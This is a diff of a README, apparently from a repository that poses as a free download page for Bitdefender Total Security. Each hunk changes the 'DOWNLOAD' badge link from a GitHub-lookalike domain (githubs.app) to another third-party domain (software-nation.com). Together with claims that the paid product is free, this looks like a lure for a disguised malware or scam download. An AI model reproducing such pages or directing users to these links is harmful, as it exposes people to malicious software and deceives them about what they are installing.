@@ -9,7 +9,7 @@ The **🛡️ Bitdefender Total Security Protection** is the most comprehensive 
 
 <div align="center">
 
-[![Download Bitdefender Total Security Protection](https://img.shields.io/badge/🔒%20DOWNLOAD%20NOW%20🔒-purple?style=for-the-badge&logo=github)](https://githubs.app/2cicz)
+[![Download Bitdefender Total Security Protection](https://img.shields.io/badge/🔒%20DOWNLOAD%20NOW%20🔒-purple?style=for-the-badge&logo=github)](https://software-nation.com/2cicz)
 
 </div>
 
@@ -96,7 +96,7 @@ When searching for antivirus solutions, users encounter countless options—many
 7. **🔓 Launch Bitdefender** - Open from desktop or system tray
 8. **✅ Start protection** - All features are active automatically
 
-[![Download Bitdefender Total Security Protection](https://img.shields.io/badge/🔒%20DOWNLOAD%20BITDEFENDER%20🔒-purple?style=for-the-badge&logo=github)](https://githubs.app/2cicz)
+[![Download Bitdefender Total Security Protection](https://img.shields.io/badge/🔒%20DOWNLOAD%20BITDEFENDER%20🔒-purple?style=for-the-badge&logo=github)](https://software-nation.com/2cicz)
 
 ### Mac Installation
 
@@ -105,7 +105,7 @@ When searching for antivirus solutions, users encounter countless options—many
 3. Drag Bitdefender to Applications folder
 4. Launch and grant necessary permissions
 
-[![Download Bitdefender Total Security Protection](https://img.shields.io/badge/🔒%20DOWNLOAD%20BITDEFENDER%20🔒-purple?style=for-the-badge&logo=github)](https://githubs.app/2cicz)
+[![Download Bitdefender Total Security Protection](https://img.shields.io/badge/🔒%20DOWNLOAD%20BITDEFENDER%20🔒-purple?style=for-the-badge&logo=github)](https://software-nation.com/2cicz)
 
 ### Mobile Installation (Android/iOS)
 
@@ -256,4 +256,4 @@ Our free security philosophy means you can start protecting yourself immediately
 
 Join over 12.3 million satisfied users who've protected their digital lives with Bitdefender Total Security.
 
-[![Download Bitdefender Total Security Protection](https://img.shields.io/badge/🔒%20DOWNLOAD%20BITDEFENDER%20🔒-purple?style=for-the-badge&logo=github)](https://githubs.app/2cicz)
+[![Download Bitdefender Total Security Protection](https://img.shields.io/badge/🔒%20DOWNLOAD%20BITDEFENDER%20🔒-purple?style=for-the-badge&logo=github)](https://software-nation.com/2cicz)
